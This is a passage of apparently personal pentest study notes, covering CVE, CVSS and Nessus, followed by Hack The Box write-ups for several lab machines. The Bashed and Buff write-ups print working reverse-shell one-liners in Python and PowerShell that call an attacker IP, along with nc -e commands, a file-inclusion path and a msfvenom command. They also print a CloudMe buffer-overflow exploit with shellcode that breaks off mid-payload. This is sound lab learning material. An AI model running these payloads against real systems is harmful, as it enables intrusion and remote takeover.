available for public use.</li> <li> <p>Community Involvement:</p> </li> <li> <p>Encourages collaboration and sharing of security content among professionals.</p> </li> <li>Central to automating vulnerability management and ensuring systems meet compliance requirements.</li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#applications","title":"Applications","text":"<ol> <li> <p>Vulnerability Management:</p> <ul> <li>Standardizes how vulnerabilities are defined and detected.</li> <li>Enables automated scans and assessments.</li> <li> <p>Policy Compliance:</p> </li> <li> <p>Ensures systems align with organizational and regulatory policies.</p> </li> <li> <p>Security Measurement:</p> </li> <li> <p>Tracks and evaluates the security posture of systems over time.</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#benefits","title":"Benefits","text":"<ol> <li>Standardization:<ul> <li>Provides a common language for encoding and sharing vulnerability definitions.</li> </ul> </li> <li>Automation:<ul> <li>Streamlines vulnerability detection and policy compliance checks.</li> </ul> </li> <li>Community Collaboration:<ul> <li>Leverages shared knowledge for broader security improvements.</li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#key-takeaway","title":"Key Takeaway","text":"<p>OVAL plays a critical role in security automation and standardization, empowering organizations to efficiently assess vulnerabilities, enforce compliance, and improve overall security. ![[Pasted image 20241211233828.png]]</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#common-vulnerabilities-and-exposures-cve","title":"Common Vulnerabilities and Exposures (CVE)","text":"<p>![[Pasted image 20241211234325.png]]</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stages-of-obtaining-a-cve","title":"Stages of Obtaining a CVE","text":""},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-1-identify-if-cve-is-required-and-relevant","title":"Stage 1: Identify if CVE is Required and Relevant","text":"<p>Identify if the issue found is a vulnerability. According to the CVE Team, \"A vulnerability in the context of the CVE Program is indicated by code that can be exploited, resulting in a negative impact to confidentiality, integrity, OR availability, and that requires a coding change, specification change, or specification deprecation to mitigate or address.\" Additionally, research should verify there is not a CVE ID already in the CVE database.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-2-reach-out-to-affected-product-vendor","title":"Stage 2: Reach Out to Affected Product Vendor","text":"<p>A researcher should ensure they have made a good faith effort to contact a vendor directly. Researchers can reference CVE's\u00a0Documents on Disclosure Practices\u00a0for additional information.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-3-identify-if-request-should-be-for-vendor-cna-or-third-party-cna","title":"Stage 3: Identify if Request Should Be For Vendor CNA or Third Party CNA","text":"<p>If a company is a part of participating CNA's, they can assign a CVE ID for one of their products. If the issue is for a participating CNA, researchers can contact the appropriate CNA organization\u00a0here. If the vendor is not a participating CNA, a researcher should attempt to reach out to the vendor's third-party coordinator.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-4-requesting-cve-id-through-cve-web-form","title":"Stage 4: Requesting CVE ID Through CVE Web Form","text":"<p>The CVE Team has a form that can be filled out online\u00a0here\u00a0if the methods above do not work for CVE requests.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-5-confirmation-of-cve-form","title":"Stage 5: Confirmation of CVE Form","text":"<p>Upon submitting the CVE Web Form mentioned in Stage 4, an individual will receive a confirmation email. The CVE team will contact the requestor if any additional information is required.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-6-receival-of-cve-id","title":"Stage 6: Receival of CVE ID","text":"<p>Upon approval, the CVE Team will notify the requestor of a CVE ID if the affected product's vulnerability is confirmed. Please note that the CVE ID is not public yet at this stage.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-7-public-disclosure-of-cve-id","title":"Stage 7: Public Disclosure of CVE ID","text":"<p>CVE IDs can be announced to the public as soon as appropriate vendors and parties are aware of the issue to prevent duplication of CVE IDs. This stage ensures that all associated parties are aware of the problem before being publicly disclosed.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-8-announcing-the-cve","title":"Stage 8: Announcing the CVE","text":"<p>The CVE Team asks researchers who are sharing multiple CVEs to ensure each CVE indicates the different vulnerabilities. Additional information can be found\u00a0here.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#stage-9-providing-information-to-the-cve-team","title":"Stage 9: Providing Information to The CVE Team","text":"<p>At this stage, the CVE Team asks that the researcher help provide additional information to be used in the official CVE listing on the website. The\u00a0U.S. National Vulnerability Database (NVD)\u00a0maintains this information online in their database as well.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#responsible-disclosure","title":"Responsible Disclosure","text":"<p>Security researchers and consultants constantly reference the CVE database since it consists of thousands of vulnerabilities that could be leveraged for exploitation. In addition, there are also times when individuals may come across an issue they have never seen in the wild or it has never disclosed while digging into a specific software or program.</p> <p>Responsible disclosure is essential in the security community because it allows an organization or researcher to work directly with a vendor providing them with the issue details first to ensure a patch is available before the vulnerability announcement to the world. If an issue is not responsibly disclosed to a vendor, real threat actors may be able to leverage the issues for criminal use, also referred to as a\u00a0<code>zero day</code>\u00a0or an\u00a0<code>0-day</code>.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#examples","title":"Examples","text":""},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#cve-2020-5902","title":"CVE-2020-5902","text":"<p>CVE-2020-5902\u00a0is an unauthenticated, remote code execution vulnerability in the BIG-IP Traffic Management User Interface (TMUI). The issue is exploitable when TMUI is available through the BIG-IP management port and leads to a complete system takeover since an attacker could execute code, edit files, and enable or disable services on the remote host.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#cve-2021-34527","title":"CVE-2021-34527","text":"<p>CVE-2021-34527, also known as PrintNightmare, is a remote code execution vulnerability within the Windows Print Spooler service. The Windows Print Spooler service can be abused due to the service improperly handling privileges file operations. The issue requires a user to be authenticated but allows complete takeover of a system from remote or local code execution. The issue is extremely dangerous since it allows an attacker to fully control a domain since it exploits servers (including domain controllers) and workstations.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerabilities%20and%20Exposures%20%28CVE%29/#getting-hands-on","title":"Getting Hands-on","text":"<p>Now that we've defined key terms, discussed assessment types, vulnerability scoring, and disclosure, let's move on to getting familiar with two popular vulnerability scanning tools: Nessus and OpenVAS.</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerability%20Scoring%20System%20%28CVSS%29/","title":"Common Vulnerability Scoring System (CVSS)","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Vulnerability/Common%20Vulnerability%20Scoring%20System%20%28CVSS%29/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <p>![[Pasted image 20241211233102.png]] 1. Purpose:</p> <pre><code>- Industry standard for calculating vulnerability severity.\n- Helps categorize and prioritize vulnerabilities based on their severity.\n</code></pre> <ol> <li> <p>Key Components:</p> <ul> <li>Exploitability Metrics:<ul> <li>Access Vector: How the vulnerability can be exploited (e.g., local, network).</li> <li>Access Complexity: The complexity of exploiting the vulnerability (e.g., low, medium, high).</li> <li>Authentication: Whether authentication is required for exploitation.</li> </ul> </li> <li>Impact Metrics:<ul> <li>Confidentiality: Impact on data confidentiality if exploited.</li> <li>Integrity: Impact on data accuracy and trustworthiness.</li> <li>Availability: Impact on system uptime and performance.</li> </ul> </li> </ul> </li> <li> <p>Practical Use:</p> <ul> <li>CVSS scores are often calculated by scanning tools.</li> <li>Security professionals should understand the scoring methodology to:<ul> <li>Manually calculate scores when needed.</li> <li>Justify the scores applied to vulnerabilities.</li> </ul> </li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Common%20Vulnerability%20Scoring%20System%20%28CVSS%29/#dread-model","title":"DREAD Model","text":"<ol> <li> <p>Overview:</p> <ul> <li>Developed by Microsoft as a risk assessment framework.</li> <li>Uses a 10-point scale to evaluate security threats and vulnerabilities.</li> <li> <p>Five Key Factors:</p> </li> <li> <p>Damage Potential: The extent of harm caused if exploited.</p> </li> <li>Reproducibility: The ease with which the attack can be repeated.</li> <li>Exploitability: The effort required to exploit the vulnerability.</li> <li>Affected Users: The number or percentage of users impacted.</li> <li>Discoverability: How easily the vulnerability can be found by attackers.</li> <li> <p>Applications:</p> </li> <li> <p>Integral to Microsoft\u2019s security strategy for monitoring and responding to threats.</p> </li> <li>Helps IT professionals assess and prioritize security threats in Microsoft products and other environments.</li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Common%20Vulnerability%20Scoring%20System%20%28CVSS%29/#severity-scoring-and-prioritization","title":"Severity Scoring and Prioritization","text":"<ol> <li> <p>Combining CVSS and DREAD:</p> <ul> <li>Together, they provide a structured way to assess and prioritize vulnerabilities based on their risk and severity.</li> <li> <p>Organizational Benefits:</p> </li> <li> <p>Allows teams to focus on addressing the most critical issues first.</p> </li> <li>Enhances understanding of vulnerabilities' exploitability and impact.</li> <li> <p>Key Takeaway:</p> </li> <li> <p>Both CVSS and DREAD emphasize structured, repeatable processes for assessing risks, ensuring organizations can effectively manage their security posture. -![[Pasted image 20241211233726.png]]</p> </li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Getting%20Started%20with%20Nessus/","title":"Getting Started with Nessus","text":"Tips <p>Here we cad add tips or tricks.</p>"},{"location":"CPTS/Vulnerability/Getting%20Started%20with%20Nessus/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Vulnerability/Getting%20Started%20with%20Nessus/#nessus-scan","title":"Nessus Scan","text":"<p>http://localhost:8834</p>"},{"location":"CPTS/Vulnerability/Getting%20Started%20with%20Nessus/#network-impact","title":"Network Impact","text":"<p>[nvStat] It is also essential to keep in mind the potential impact of vulnerability scanning on a network, especially on low bandwidth or congested links. This can be measured using\u00a0vnstat: <pre><code>sudo apt install vnstat\n</code></pre></p> <p>Let's monitor the\u00a0<code>eth0</code>\u00a0network adapter before running a Nessus scan:</p> <pre><code>0xs5@htb[/htb]$ sudo vnstat -l -i eth0\n\nMonitoring eth0...    (press CTRL-C to stop)\n\n   rx:       332 bit/s     0 p/s          tx:       332 bit/s     0 p/s\n\n   rx:         0 bit/s     0 p/s          tx:         0 bit/s     0 p/s\n   rx:         0 bit/s     0 p/s          tx:         0 bit/s     0 p/s^C\n\n eth0  /  traffic statistics\n\n                           rx         |       tx\n--------------------------------------+------------------\n  bytes                        572 B  |           392 B\n--------------------------------------+------------------\n          max              480 bit/s  |       332 bit/s\n      average              114 bit/s  |        78 bit/s\n          min                0 bit/s  |         0 bit/s\n--------------------------------------+------------------\n  packets                          8  |               5\n--------------------------------------+------------------\n          max                  1 p/s  |           0 p/s\n      average                  0 p/s  |           0 p/s\n          min                  0 p/s  |           0 p/s\n--------------------------------------+------------------\n  time                    40 seconds\n</code></pre> <p>We can compare this result with the result we get when monitoring the same interface during a Nessus scan against just one host:</p> <p>Scanning Issues</p> <pre><code>0xs5@htb[/htb]$ sudo vnstat -l -i eth0\n\nMonitoring eth0...    (press CTRL-C to stop)\n\n   rx:   307.92 kbit/s   641 p/s          tx:   380.41 kbit/s   767 p/s^C\n\n eth0  /  traffic statistics\n\n                           rx         |       tx\n--------------------------------------+------------------\n  bytes                     1.04 MiB  |        1.34 MiB\n--------------------------------------+------------------\n          max          414.81 kbit/s  |   480.59 kbit/s\n      average          230.57 kbit/s  |   296.72 kbit/s\n          min                0 bit/s  |         0 bit/s\n--------------------------------------+------------------\n  packets                      18252  |           22733\n--------------------------------------+------------------\n          max                864 p/s  |         969 p/s\n      average                480 p/s  |         598 p/s\n          min                  0 p/s  |           0 p/s\n--------------------------------------+------------------\n  time                    38 seconds\n\n\nreal  0m38.588s\nuser  0m0.002s\nsys 0m0.016s\n</code></pre> <p>When comparing the results, we can see that the number of bytes and packets transferred during a vulnerability scan is quite significant and can severely impact a network if not tuned properly or performed against fragile/sensitive devices.</p> <p>Previous</p>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/","title":"Vulnerability Assessment","text":""},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#notes-on-vulnerability-assessment","title":"Notes on Vulnerability Assessment","text":"<ol> <li> <p>Definition and Purpose:</p> <ul> <li>Identifies and categorizes risks and security weaknesses in an environment.</li> <li>Focuses on identifying issues without extensive manual exploitation.</li> <li>Provides remediation steps to address identified vulnerabilities.</li> <li> <p>Key Characteristics:</p> </li> <li> <p>Little to no manual exploitation; primarily relies on automated tools/scanners.</p> </li> <li>Some assessments may involve minimally invasive exploitation to confirm findings and rule out false positives.</li> <li> <p>Customer Expectations:</p> </li> <li> <p>Clarify the scope and intent before starting the assessment.</p> </li> <li>Customers may request:<ul> <li>Validation of vulnerabilities through light exploitation.</li> <li>A comprehensive report based solely on scanner findings.</li> </ul> </li> <li> <p>Importance of Vulnerability Management:</p> </li> <li> <p>Helps organizations:</p> <ul> <li>Identify weaknesses in their assets.</li> <li>Understand and categorize risk levels.</li> <li>Prioritize and plan remediation efforts.</li> </ul> </li> <li> <p>Patch Testing:</p> </li> <li> <p>Essential to thoroughly test significant patches before deployment.</p> </li> <li>Prevents disruptions and ensures patches are compatible with the environment.</li> </ul> </li> </ol> <p>Methodology 8 steps to performing a network vulnerability assessment ![[Pasted image 20241209213225.png]]</p> <p>![[Pasted image 20241210231821.png]]</p>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#threat","title":"Threat","text":"<p>A\u00a0<code>Threat</code>\u00a0is a process that amplifies the potential of an adverse event, such as a threat actor exploiting a vulnerability. Some vulnerabilities raise more threat concerns over others due to the probability of the vulnerability being exploited. For example, the higher the reward of the outcome and ease of exploitation, the more likely the issue would be exploited by threat actors.</p>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#exploit","title":"Exploit","text":"<p>An\u00a0<code>Exploit</code>\u00a0is any code or resources that can be used to take advantage of an asset's weakness. Many exploits are available through open-source platforms such as\u00a0Exploit-db\u00a0or\u00a0the Rapid7 Vulnerability and Exploit Database. We will often see exploit code hosted on sites such as GitHub and GitLab as well.</p>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#risk","title":"Risk","text":"<p><code>Risk</code>\u00a0is the possibility of assets or data being harmed or destroyed by threat actors.</p> <p>![[Pasted image 20241210232056.png]]</p> <p>To differentiate the three, we can think of it as follows:</p> <ul> <li><code>Risk</code>: something bad that could happen</li> <li><code>Threat</code>: something bad that is happening</li> <li><code>Vulnerabilities</code>: weaknesses that could lead to a threat ![[Pasted image 20241210232144.png]]</li> </ul>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#asset-inventory-overview","title":"Asset Inventory Overview","text":"<ol> <li> <p>Purpose:</p> <ul> <li>Critical for effective vulnerability management.</li> <li>Enables organizations to understand and protect assets, setting up proper defenses.</li> </ul> </li> <li> <p>Components of Asset Inventory:</p> <ul> <li>Information Technology (IT): Hardware and software used in daily operations.</li> <li>Operational Technology (OT): Systems managing industrial processes.</li> <li>Physical Assets: Devices, servers, and other physical infrastructure.</li> <li>Software Assets: Locally installed and cloud-based software.</li> <li>Mobile Assets: Smartphones, tablets, and other portable devices.</li> <li>Development Assets: Resources used in software and system development.</li> </ul> </li> <li> <p>Asset Management Tools:</p> <ul> <li>Utilized to track and manage assets effectively.</li> <li>Assets should be classified by data sensitivity to apply appropriate security and access controls.</li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#application-and-system-inventory","title":"Application and System Inventory","text":"<ol> <li> <p>Purpose:</p> <ul> <li>Create a thorough inventory of data assets for robust defensive security.</li> <li> <p>Data Assets to Include:</p> </li> <li> <p>On-Premises Storage:</p> <ul> <li>HDDs, SSDs, external drives, optical media, flash media, and legacy technologies (e.g., floppy disks, ZIP drives).</li> </ul> </li> <li>Cloud Storage:<ul> <li>Data stored with providers like AWS, GCP, Azure.</li> <li>Multi-cloud environments require inventory across multiple providers.</li> </ul> </li> <li>SaaS Applications:<ul> <li>Includes consumer and business versions of services like Google Drive, Dropbox, iCloud, Office 365, and more.</li> </ul> </li> <li>Applications:<ul> <li>Both locally deployed and cloud-based applications critical to business operations.</li> </ul> </li> <li>Networking Devices:<ul> <li>Routers, firewalls, switches, hubs, IDS/IPS, DLP systems, and more.</li> </ul> </li> <li> <p>Key Considerations:</p> </li> <li> <p>Any threat to these assets can compromise information security and business operations.</p> </li> <li>Comprehensive assessment ensures no asset is overlooked.</li> </ul> </li> </ol>"},{"location":"CPTS/Vulnerability/Vulnerability%20Assessment/#maintaining-and-updating-asset-inventory","title":"Maintaining and Updating Asset Inventory","text":"<ol> <li> <p>Dynamic Nature of Assets:</p> <ul> <li>Organizations frequently add or remove devices, storage, and cloud resources.</li> <li>Regular updates are essential to ensure the inventory remains accurate.</li> <li> <p>Importance of Accuracy:</p> </li> <li> <p>Missing an asset in the inventory leaves it vulnerable to threats.</p> </li> <li>Thorough documentation is crucial for effective protection and management.</li> </ul> </li> </ol>"},{"location":"HTB/easy/Bashed/","title":"Bashed","text":""},{"location":"HTB/easy/Bashed/#nmap-scan","title":"Nmap scan","text":"<p><pre><code>nmap -sC -sV -oA &lt;IP&gt;\n</code></pre> </p>"},{"location":"HTB/easy/Bashed/#directory-busting","title":"Directory Busting","text":"<pre><code>feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.80.188\n</code></pre>"},{"location":"HTB/easy/Bashed/#found","title":"Found:","text":"<ul> <li>/upload</li> <li>/php</li> <li>/dev</li> <li>/images</li> </ul>"},{"location":"HTB/easy/Bashed/#exploiting-with-phpbash","title":"Exploiting with phpbash","text":"<p>http://10.10.10.68/dev/phpbash.php is accessible which means we have a shell. \ud83d\ude32</p> <p>The /dev has two files and when run the phpbash.php we get a shell where we can run commands from the webpage. </p> <p> The /upload directory allows uploads. Hosting the php-reverse-shell.php file on the attacker machine via python.</p> <p><pre><code>locate php-reverse-shell.php\npython3 -m http.server\n</code></pre> Make sure the script $ip and $port are change to kali/attacker machine and listening port.</p> <p>Back to the webpage to get the file via <code>wget</code></p> <pre><code>wget http://&lt;kali IP&gt;:8000/php-reverse-shell.php\n</code></pre> <p>Start the listener on the Kali <pre><code>nc -lvnp 88888\n</code></pre> Run the scrip or reload the page http:///dev/php-reverse-shell.php <p>Get the shell.</p>"},{"location":"HTB/easy/Bashed/#user-flag","title":"User Flag","text":"<pre><code>$ cd home\n$ ls\narrexel\nscriptmanager\n$ cd arrexel\n$ ls\nuser.txt\n$ cat user.txt\n1b6901a1040b46fa1eee0c9b450ac920\n$ \n</code></pre>"},{"location":"HTB/easy/Bashed/#privesc","title":"PrivEsc","text":"<p>Presistant the shell. <pre><code>python3 -c 'import pty; pty.spawn(\"bin/bash\")'\n# Control + Z to background the shell.\nstty raw -echo\nfg ## ENTER few times\nsudo -u scriptmanager bash\n</code></pre></p>"},{"location":"HTB/easy/Bashed/#output","title":"Output","text":"<pre><code>scriptmanager@bashed:/scripts$ id\nuid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)\n</code></pre> <p>Now the shell is presistent and navigating to the script directory is possible.</p>"},{"location":"HTB/easy/Bashed/#two-files","title":"Two files:","text":"<ol> <li>test.py</li> <li>test.txt These files are writable. These files have a root ownership. date are craeted and update as the box is being pawned.</li> </ol>"},{"location":"HTB/easy/Bashed/#reverse-shell-py","title":"Reverse Shell .py","text":"<p>Search for erverse shell python and try few by adding to the test.py file to get the reverse shell.</p> <p><pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.8\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n</code></pre> after saving the revershell to the test.py and start the listener on port 1234, type <code>date</code> on the shell and give it few seconds before get the callback as a root shell. </p>"},{"location":"HTB/easy/Bashed/#root-flag","title":"Root flag","text":"<pre><code># cd root\n# ls\nroot.txt\n# cat root.txt\n6551a1b39055cb184e69ab41c7951c4f\n</code></pre>"},{"location":"HTB/easy/Beep/","title":"Beep","text":""},{"location":"HTB/easy/Beep/#nmap-scan","title":"Nmap scan","text":""},{"location":"HTB/easy/Beep/#port-80","title":"Port 80","text":""},{"location":"HTB/easy/Beep/#metasploit","title":"Metasploit","text":"<p>Searched for the elastix on the metasploit and found a file Inclusion.  <code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code></p> <p></p>"},{"location":"HTB/easy/Beep/#following-the-ptes-framewrok","title":"Following the PTES Framewrok.","text":"<ol> <li>Pre-Enagement Interaction</li> <li>Intelligence Gathering</li> <li>Threat Modeling</li> <li>Vulnerability Analysis</li> <li>Exploitation</li> <li>Post Exploitation</li> <li>Reporting</li> </ol>"},{"location":"HTB/easy/Blunder/","title":"Blunder Walkthrough","text":"<pre><code>10.129.95.225\n</code></pre>"},{"location":"HTB/easy/Blunder/#nmap-scan","title":"Nmap scan","text":"<p>After visting the front site there is a admin panel on the http://ip/admin  </p> <p>As we can see the <code>bludit</code> is the name of the CMS here. a quick google search will give use a bit more iformation about the CMS hosted on this server.  </p>"},{"location":"HTB/easy/Buff/","title":"Buff","text":""},{"location":"HTB/easy/Buff/#following-the-ptes-framewrok","title":"Following the PTES Framewrok.","text":"<ol> <li>Pre-Enagement Interaction</li> <li>Intelligence Gathering</li> <li>Threat Modeling</li> <li>Vulnerability Analysis</li> <li>Exploitation</li> <li>Post Exploitation</li> <li>Reporting</li> </ol>"},{"location":"HTB/easy/Buff/#nmap-scan","title":"Nmap scan","text":"<p> Nmap reveals that the port '8080', visiting the page will load a exercise webpage.  <code>Projectworlds.in</code> It could a project from this site &lt;==</p>"},{"location":"HTB/easy/Buff/#the-contact-page-shows","title":"The contact page shows:","text":"<ul> <li><code>mrb3n's Bro Hut</code></li> <li><code>Made using Gym Management Software 1.0</code> From the index.php it's clear that the site is build with php.</li> </ul>"},{"location":"HTB/easy/Buff/#directory-busting","title":"Directory Busting","text":"<p>Let's run Gobuster. <pre><code>gobuster dir -w words.txt -u http://&lt;ip&gt;\n</code></pre></p>"},{"location":"HTB/easy/Buff/#metasploit","title":"Metasploit","text":"<p>Searching for <code>Gym Management</code> on <code>searchsploit</code> will give few results.  Using the Remote Code Execution with no Authentication? Sounds interesting so let's try.</p> <p>copy the file to local directory and use legacy <code>python2</code> to run this. <pre><code>python2 exploit.py &lt;ip&gt;:8080/\n</code></pre> we get a shell. </p>"},{"location":"HTB/easy/Buff/#priv-esc","title":"Priv Esc","text":"<p>The shell above is not presistant, Can't change directories or anuthong. need a better shell. Using Nashing will get more presistance shell.  Copy the <code>Invoke-PowerShellTcpOneLine.ps1</code> to locate directory and change the ip to attacker machine with a port. </p> <p></p> <p><pre><code> $client = New-Object System.Net.Sockets.TCPClient('10.10.16.3',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};whi\n       \u2502 le(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,\n       \u2502  $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASC\n       \u2502 II).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre> Now let's set up a python3 server to upload this to the target machine.</p> <pre><code>python3 -m http.server\n</code></pre>"},{"location":"HTB/easy/Buff/#the-above-reverse-shell-did-not-work-lets-go-different-way","title":"THE ABOVE REVERSE SHELL DID NOT WORK let's go different way.","text":""},{"location":"HTB/easy/Buff/#uing-ncexe-to-get-the-powershell","title":"Uing nc.exe to get the powershell","text":"<p>Copy the nc.exe to local directory and host with python. Curl the nc.exe file on the target machine.</p> <pre><code>curl 10.10.16.3:6000/nc.exe -o nc.exe\n</code></pre> <p>Start listening to the on a port</p> <pre><code>nc -lvnp 9001\n</code></pre> <p>On the target machine run the command <pre><code>nc.exe 10.10.16.3 9001 -e powershell\n</code></pre></p> <p>We have a shell. </p> <p>Since the shell is more presistenct, Changing the directory is possible. <pre><code>PS C:\\Users\\shaun\\Desktop&gt; type user.txt \ntype user.txt\n9b3c941baed51cee57e9d397964b468e\n</code></pre></p>"},{"location":"HTB/easy/Buff/#runing-winpeasps1","title":"Runing winPEAS.ps1","text":"<p>Copy the winPEAS.exe to local directory and host then curl to the target machine and run. </p> <p><pre><code>curl 10.10.16.3:6000/winPEAS.exe\n</code></pre> Once done uploading, run it <code>.\\winPEAS.exe</code></p> <p>Going through the winpeas output found the CloudMe and search sploit shows that there is a buffer overflow exploit. </p>"},{"location":"HTB/easy/Buff/#list-listeing-ports","title":"list LISTEING PORTS","text":"<pre><code>netstat -an\n</code></pre>"},{"location":"HTB/easy/Buff/#http-tunnel-with-chisel","title":"HTTP Tunnel with Chisel","text":"<p>Download chisel.exe and chisel for linux and transfer the chisel.exe to the target machine. <pre><code>curl &lt;kali IP&gt;:port/chisel.exe -o chisel.exe\n</code></pre></p>"},{"location":"HTB/easy/Buff/#run-chisel","title":"Run chisel","text":"<p>Cleint (target machien)  <pre><code>.\\chisel.exe client 10.10.16.3:9002 R:3306:localhost:3306 R:8888:localhost:8888\n</code></pre></p>"},{"location":"HTB/easy/Buff/#kali","title":"Kali","text":"<pre><code>./chisel server --reverse --port 9002\n</code></pre> <p>On a seprate window run <pre><code>nc localhost 8888 or 3306\n</code></pre></p>"},{"location":"HTB/easy/Buff/#connecting-to-mysql","title":"Connecting to mysql","text":"<p><pre><code>mysql -u root -p -h 127.0.0.1 --ssl=0\n</code></pre> --ssl=0 for Maria db to disable ssl </p> <p><pre><code>show databases;\nuse test;\nshow tables;\n</code></pre> Looks like all the tables are empty; </p>"},{"location":"HTB/easy/Buff/#check-if-there-is-chisel","title":"check if there is chisel","text":"<pre><code>ss -lnpt | grep 3306\n</code></pre>"},{"location":"HTB/easy/Buff/#list-all-the-payloads","title":"List all the payloads","text":"<p><pre><code>## Get the msfvenom from the cloudMe exploit that we found\ngrep -i 'msfvenom' cloudme_exploit.py\nmsfvenom -l payload\n</code></pre> Need to create a paylaod and use reverse_shell  <pre><code>## kali ip and port to listen on\nmsfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9004 -b '\\x00\\x0A\\x0D' -f python\n</code></pre> </p> <p>copy the payload and added to the .py cloudMe file replacing the existance code (buffer part)</p> <p>addd at the end  <pre><code>payload=buf\n</code></pre></p> <p>Listen on local port 9004 in this case <pre><code>nc -lvnp 9004\n</code></pre> Now run the cloudMe.py exploit (the name was change for the exploit from 48389.py) <pre><code>python3 cloudme_exploit.py\n</code></pre> </p>"},{"location":"HTB/easy/Buff/#roottxt","title":"Root.txt","text":"<pre><code>#Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)\n# Date: 2020-04-27\n# Exploit Author: Andy Bowden\n# Vendor Homepage: https://www.cloudme.com/en\n# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe\n# Version: CloudMe 1.11.2\n# Tested on: Windows 10 x86\n\n#Instructions:\n# Start the CloudMe service and run the script.\n\nimport socket\n\ntarget = \"127.0.0.1\"\n\npadding1   = b\"\\x90\" * 1052\nEIP        = b\"\\xB5\\x42\\xA8\\x68\" # 0x68A842B5 -&gt; PUSH ESP, RET\nNOPS       = b\"\\x90\" * 30\n\n# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=&lt;attacker_ip&gt; LPORT=&lt;attacker_port&gt; -b '\\x00\\x0A\\x0D' -f python\nbuf =  b\"\"\nbuf += b\"\\xd9\\xeb\\xba\\x2a\\x18\\xb0\\x34\\xd9\\x74\\x24\\xf4\\x5e\"\nbuf += b\"\\x29\\xc9\\xb1\\x52\\x83\\xc6\\x04\\x31\\x56\\x13\\x03\\x7c\"\nbuf += b\"\\x0b\\x52\\xc1\\x7c\\xc3\\x10\\x2a\\x7c\\x14\\x75\\xa2\\x99\"\nbuf += b\"\\x25\\xb5\\xd0\\xea\\x16\\x05\\x92\\xbe\\x9a\\xee\\xf6\\x2a\"\nbuf += b\"\\x28\\x82\\xde\\x5d\\x99\\x29\\x39\\x50\\x1a\\x01\\x79\\xf3\"\nbuf += b\"\\x98\\x58\\xae\\xd3\\xa1\\x92\\xa3\\x12\\xe5\\xcf\\x4e\\x46\"\nbuf += b\"\\xbe\\x84\\xfd\\x76\\xcb\\xd1\\x3d\\xfd\\x87\\xf4\\x45\\xe2\"\nbuf += b\"\\x50\\xf6\\x64\\xb5\\xeb\\xa1\\xa6\\x34\\x3f\\xda\\xee\\x2e\"\nbuf += 